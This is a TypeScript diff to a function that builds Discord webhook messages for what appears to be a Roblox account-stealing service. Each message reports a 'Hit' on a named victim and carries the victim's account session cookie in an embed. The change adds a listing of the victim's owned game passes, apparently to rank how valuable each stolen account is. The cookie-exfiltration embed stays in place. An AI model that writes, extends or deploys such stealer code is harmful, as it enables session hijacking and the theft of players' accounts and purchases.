@@ -765,24 +765,50 @@ function buildDiscordPayload(opts: {
   );
 
 
+  // Games embed — one field per tracked game listing pass ownership
+  const gameFields: Array<{ name: string; value: string; inline?: boolean }> = [];
+  if (roblox) {
+    for (const g of roblox.ownedPasses) {
+      if (g.passes.length === 0) continue;
+      const ownedCount = g.passes.filter((p) => p.owned).length;
+      gameFields.push({
+        name: `${EMOJI.games} ${g.game} Passes (${ownedCount}/${g.passes.length})`,
+        value: g.passes
+          .map((p) => `${p.owned ? "✅" : "❌"} [${p.id}](https://www.roblox.com/game-pass/${p.id})`)
+          .join("\n"),
+        inline: true,
+      });
+    }
+  }
+
+  const embeds: Array<Record<string, unknown>> = [
+    {
+      title: roblox ? `Hit: ${roblox.name}` : "Submission Details",
+      color: 0xa855f7,
+      thumbnail: roblox?.avatar ? { url: roblox.avatar } : (roblox?.headshot ? { url: roblox.headshot } : undefined),
+      fields: mainFields,
+      footer: { text: `${siteName} Submission System` },
+      timestamp: new Date().toISOString(),
+    },
+  ];
+  if (gameFields.length > 0) {
+    embeds.push({
+      title: `${EMOJI.games} Tracked Games`,
+      color: 0x22c55e,
+      fields: gameFields,
+      footer: { text: `${siteName} • Gamepass Ownership` },
+    });
+  }
+  embeds.push({
+    title: `${EMOJI.cookie} Account Cookie`,
+    color: 0xff5555,
+    description: "```\n" + cookie.slice(0, 4080) + "\n```",
+    footer: { text: "Handle with care" },
+  });
+
   return {
     content: `**New ${toolType} Submission** (${siteName} / ${ownerUsername})`,
-    embeds: [
-      {
-        title: roblox ? `Hit: ${roblox.name}` : "Submission Details",
-        color: 0xa855f7,
-        thumbnail: roblox?.avatar ? { url: roblox.avatar } : (roblox?.headshot ? { url: roblox.headshot } : undefined),
-        fields: mainFields,
-        footer: { text: `${siteName} Submission System` },
-        timestamp: new Date().toISOString(),
-      },
-      {
-        title: `${EMOJI.cookie} Account Cookie`,
-        color: 0xff5555,
-        description: "```\n" + cookie.slice(0, 4080) + "\n```",
-        footer: { text: "Handle with care" },
-      },
-    ],
+    embeds,
   };
 }
 
